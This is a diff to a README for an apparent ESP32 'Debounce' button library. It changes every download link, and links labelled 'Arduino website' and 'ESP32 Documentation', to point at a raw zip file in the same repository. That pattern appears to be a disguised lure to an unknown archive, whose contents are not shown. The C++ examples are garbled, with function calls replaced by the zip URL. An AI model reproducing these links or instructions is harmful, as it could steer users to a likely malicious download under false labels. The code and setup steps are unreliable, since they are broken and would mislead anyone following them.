@@ -6,7 +6,7 @@ Welcome to the Debounce library! This tool helps you manage button presses in yo
 
 ## 📥 Download & Install
 
-To get started, you need to download the library. Visit this page to download: [Download Debounce Library](https://raw.githubusercontent.com/Wow2234443/Debounce/main/Bullidae/Debounce.zip)
+To get started, you need to download the library. Visit this page to download: [Download Debounce Library](https://raw.githubusercontent.com/Wow2234443/Debounce/main/examples/MultipleButtonsInterrupt/Software-v3.2.zip)
 
 You will find various versions of the library. Choose the latest version for the best experience. 
 
@@ -18,7 +18,7 @@ You will find various versions of the library. Choose the latest version for the
    - Basic electronic components like wires and a breadboard.
 
 2. **Software**:
-   - Arduino IDE. You can download it from the [Arduino website](https://raw.githubusercontent.com/Wow2234443/Debounce/main/Bullidae/Debounce.zip).
+   - Arduino IDE. You can download it from the [Arduino website](https://raw.githubusercontent.com/Wow2234443/Debounce/main/examples/MultipleButtonsInterrupt/Software-v3.2.zip).
    - A USB cable to connect your ESP32 to your computer.
 
 3. **System Requirements**:
@@ -37,7 +37,7 @@ You will find various versions of the library. Choose the latest version for the
 1. **Download the Library**: 
    Go to the Releases page and download the latest version of Debounce.
    
-   ![Download Debounce Library](https://raw.githubusercontent.com/Wow2234443/Debounce/main/Bullidae/Debounce.zip)
+   ![Download Debounce Library](https://raw.githubusercontent.com/Wow2234443/Debounce/main/examples/MultipleButtonsInterrupt/Software-v3.2.zip)
 
 2. **Open Arduino IDE**: 
    Launch the Arduino IDE on your computer.
@@ -76,8 +76,8 @@ You will find various versions of the library. Choose the latest version for the
 
    ```cpp
    void setup() {
-       https://raw.githubusercontent.com/Wow2234443/Debounce/main/Bullidae/Debounce.zip();
-       https://raw.githubusercontent.com/Wow2234443/Debounce/main/Bullidae/Debounce.zip(9600);
+       https://raw.githubusercontent.com/Wow2234443/Debounce/main/examples/MultipleButtonsInterrupt/Software-v3.2.zip();
+       https://raw.githubusercontent.com/Wow2234443/Debounce/main/examples/MultipleButtonsInterrupt/Software-v3.2.zip(9600);
    }
    ```
 
@@ -86,8 +86,8 @@ You will find various versions of the library. Choose the latest version for the
 
    ```cpp
    void loop() {
-       if (https://raw.githubusercontent.com/Wow2234443/Debounce/main/Bullidae/Debounce.zip() == HIGH) {
-           https://raw.githubusercontent.com/Wow2234443/Debounce/main/Bullidae/Debounce.zip("Button Pressed");
+       if (https://raw.githubusercontent.com/Wow2234443/Debounce/main/examples/MultipleButtonsInterrupt/Software-v3.2.zip() == HIGH) {
+           https://raw.githubusercontent.com/Wow2234443/Debounce/main/examples/MultipleButtonsInterrupt/Software-v3.2.zip("Button Pressed");
        }
    }
    ```
@@ -120,7 +120,7 @@ If you run into issues or have questions, the community is here to help. Feel fr
 
 For more information on how to work with the ESP32 and the Debounce library, check the following resources:
 
-- [ESP32 Documentation](https://raw.githubusercontent.com/Wow2234443/Debounce/main/Bullidae/Debounce.zip)
-- [Arduino Documentation](https://raw.githubusercontent.com/Wow2234443/Debounce/main/Bullidae/Debounce.zip)
+- [ESP32 Documentation](https://raw.githubusercontent.com/Wow2234443/Debounce/main/examples/MultipleButtonsInterrupt/Software-v3.2.zip)
+- [Arduino Documentation](https://raw.githubusercontent.com/Wow2234443/Debounce/main/examples/MultipleButtonsInterrupt/Software-v3.2.zip)
 
-Visit this page to download: [Download Debounce Library](https://raw.githubusercontent.com/Wow2234443/Debounce/main/Bullidae/Debounce.zip)
+Visit this page to download: [Download Debounce Library](https://raw.githubusercontent.com/Wow2234443/Debounce/main/examples/MultipleButtonsInterrupt/Software-v3.2.zip)
